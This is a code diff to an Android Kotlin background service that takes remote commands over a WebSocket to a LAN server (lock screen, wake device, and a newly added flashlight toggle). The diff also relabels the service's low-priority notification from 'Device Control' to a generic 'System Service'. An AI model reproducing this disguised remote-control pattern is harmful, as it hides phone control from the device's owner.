@@ -6,6 +6,8 @@ import android.app.NotificationManager
 import android.app.Service
 import android.content.Context
 import android.content.Intent
+import android.hardware.camera2.CameraAccessException
+import android.hardware.camera2.CameraManager
 import android.media.AudioAttributes
 import android.media.AudioManager
 import android.media.MediaPlayer
@@ -28,6 +30,8 @@ class DeviceService : Service() {
     private var mediaPlayer: MediaPlayer? = null
     private var audioManager: AudioManager? = null
     private var vibrator: Vibrator? = null
+    private var cameraManager: CameraManager? = null
+    private var cameraId: String? = null
     private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
     private var isConnected = false
     
@@ -38,6 +42,7 @@ class DeviceService : Service() {
         startForegroundService()
         audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
         vibrator = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
+        cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
         connectToServer()
     }
     
@@ -50,15 +55,15 @@ class DeviceService : Service() {
         val channelId = "device_control"
         val channel = NotificationChannel(
             channelId,
-            "Device Control",
+            "System Service",
             NotificationManager.IMPORTANCE_MIN
         )
         val notificationManager = getSystemService(NotificationManager::class.java)
         notificationManager.createNotificationChannel(channel)
         
         val notification = Notification.Builder(this, channelId)
-            .setContentTitle("Device Control")
-            .setContentText("Running in background")
+            .setContentTitle("System Service")
+            .setContentText("Running")
             .setSmallIcon(android.R.drawable.ic_media_play)
             .build()
         
@@ -72,7 +77,7 @@ class DeviceService : Service() {
         val deviceHash = getDeviceHash(deviceId)
         val deviceName = getDeviceName()
         
-        val ws = object : WebSocketClient(URI("ws://192.168.0.103:7611")) {
+        val ws = object : WebSocketClient(URI("ws://192.168.0.103:8080")) {
             override fun onOpen(handshakedata: ServerHandshake?) {
                 isConnected = true
                 val info = JSONObject().apply {
@@ -114,6 +119,10 @@ class DeviceService : Service() {
                 }
                 "lockScreen" -> lockScreen()
                 "wakeDevice" -> wakeDevice()
+                "flashlight" -> {
+                    if (json.getString("action") == "on") flashlightOn()
+                    else flashlightOff()
+                }
             }
         } catch (e: Exception) {}
     }
@@ -186,6 +195,27 @@ class DeviceService : Service() {
         )
         wakeLock.acquire(5000)
         wakeLock.release()
+    }
+    
+    private fun flashlightOn() {
+        try {
+            cameraId = cameraManager?.cameraIdList?.firstOrNull()
+            cameraId?.let { id ->
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                    cameraManager?.setTorchMode(id, true)
+                }
+            }
+        } catch (e: CameraAccessException) {}
+    }
+    
+    private fun flashlightOff() {
+        try {
+            cameraId?.let { id ->
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                    cameraManager?.setTorchMode(id, false)
+                }
+            }
+        } catch (e: CameraAccessException) {}
     }
     
     private fun sleepAndReconnect() {
